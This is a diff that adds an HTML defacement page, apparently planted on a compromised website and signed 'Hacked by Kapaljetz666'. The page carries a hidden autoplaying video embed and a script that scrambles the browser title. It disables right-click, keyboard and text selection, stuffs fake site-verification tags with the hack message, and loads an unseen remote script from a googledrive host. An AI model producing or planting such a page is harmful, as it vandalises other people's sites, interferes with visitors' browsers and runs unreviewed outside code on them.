@@ -1,0 +1,135 @@
+
+<html>
+<center><embed
+src="https://www.youtube.com/v/rekCuwfBZXE?rel=0&amp;autoplay=1&image=http://3.bp.blogspot.com/-RkTUcTZVXTY/UKgyroYk_xI/AAAAAAAAAF8/gUR3-QONm44/s1600/Untitled.png&repeat=always&autostart=true&frontcolor=cccccc&lightcolor=428cdb&backcolor=111111"
+width="1" height="1
+allowscriptaccess="always"></embed></center><title>
+Hacked by Kapaljetz666 | Penjaga Kamar Mayat </title>
+<link rel="shortcut icon"
+href="http://i.giphy.com/w1dT7TOSoVzPy.gif"/>
+<script language="JavaScript">
+function tb5_makeArray(n){
+ this.length = n;
+ return this.length;
+}
+
+tb5_messages = new tb5_makeArray(1);
+tb5_messages[0] = "Kapaljetz666";
+tb5_rptType = 'infinite';
+tb5_rptNbr = 10;
+tb5_speed = 50;
+tb5_delay = 2000;
+var tb5_counter=1;
+var tb5_currMsg=0;
+var tb5_stsmsg="";
+function tb5_shuffle(arr){
+var k;
+for (i=0; i<arr.length; i++){
+ k = Math.round(Math.random() * (arr.length - i - 1)) + i;
+ temp = arr[i];arr[i]=arr[k];arr[k]=temp;
+}
+return arr;
+}
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+ tb5_arr[i] = i;
+ tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+function tb5_init(n){
+var k;
+if (n == tb5_arr.length){
+ if (tb5_currMsg == tb5_messages.length-1){
+ if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){
+ clearTimeout(tb5_timerID);
+ return;
+ }
+ tb5_counter++;
+ tb5_currMsg=0;
+ }
+ else{
+ tb5_currMsg++;
+ }
+ n=0;
+ tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+ tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+ for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+ tb5_arr[i] = i;
+ tb5_sts[i] = "_";
+ }
+ tb5_arr = tb5_shuffle(tb5_arr);
+ tb5_sp=tb5_delay;
+}
+else{
+ tb5_sp=tb5_speed;
+ k = tb5_arr[n];
+ tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k);
+ tb5_stsmsg = "";
+ for (var i=0; i<tb5_sts.length; i++)
+ tb5_stsmsg += tb5_sts[i];
+ document.title = tb5_stsmsg;
+ n++;
+ }
+ tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
+}
+function tb5_randomizetitle(){
+ tb5_init(0);
+}
+tb5_randomizetitle();
+
+</script>
+<body bgcolor="black">
+<body oncontextmenu='return false;' onkeydown='return false;'
+onmousedown='return false;'>
+<meta name="google-site-verification" content="Hacked by Kapaljetz666 | Penjaga Kamar Mayat"/>
+<meta name="google-site-verification" content="Hacked by Kapaljetz666 | Penjaga Kamar Mayat"/>
+<meta name="google-site-verification" content="Hacked by Kapaljetz666 | Penjaga Kamar Mayat"/>
+<meta name="google-site-verification" content="Hacked by Kapaljetz666 | Penjaga Kamar Mayat"/>
+<meta http-equiv="Content-Language"
+content="en-us-id">
+<meta http-equiv="Content-Type" content="text/html;
+charset=iso-8859-1" />
+<meta http-equiv="Content-Type" content="text/html;
+charset=windows-1252">
+<Meta http-equiv="content-type" content="text/html;
+charset=windows-1254">
+<Meta http-equiv="content-type" content="text/html;
+charset=ISO-8859-9">
+<meta name="author" content="Kapaljetz666">
+<meta name="copyright" content="Kapaljetz666"/>
+<meta name="description"
+content="Kapaljetz666">
+<meta name="robots schedule" content="auto">
+<link href='http://fonts.googleapis.com/css?family=Abel:700'
+rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Abel:400'
+rel='stylesheet' type='text/css'>
+<link href="http://fonts.googleapis.com/css?family=Iceland"
+rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Wallpoet"
+rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Creepster"
+rel="stylesheet" type="text/css">
+
+<script type="text/javascript"> var SPklikkanan =
+'TILANG';</script> <script type="text/javascript"
+src="https://googledrive.com/host/0B6KVua7D2SLCNDN2RW1ORmhZRWs/sp_tilang.js"></script>
+<script type="text/javascript"> if (typeof
+document.onselectstart!="undefined") { document.onselectstart=new
+Function ("return false"); } else{ document.onmousedown=new
+Function ("return false"); document.onmouseup=new Function
+("return true"); } </SCRIPT>
+
+<br><br><br> <center> <a
+href="https://www.facebook.com/rafizx3290"> <img
+src="https://wallpaperscraft.com/image/itachi_naruto_shippuden_uchiha_mangekyou_sharingan_sharingan_93559_2560x1440.jpg"
+style="opacity:0.4;filter:alpha(opacity=40)"
+onmouseover="this.style.opacity=1;this.filters.alpha.opacity=100"
+onmouseout="this.style.opacity=0.4;this.filters.alpha.opacity=40"
+height="360" width="670"><br></a>
+</center>
+<br> <center> <font face="iceland"
+size="10" color="silver"> Hacked by Kapaljetz666
+</font> </center>
+</script></html>
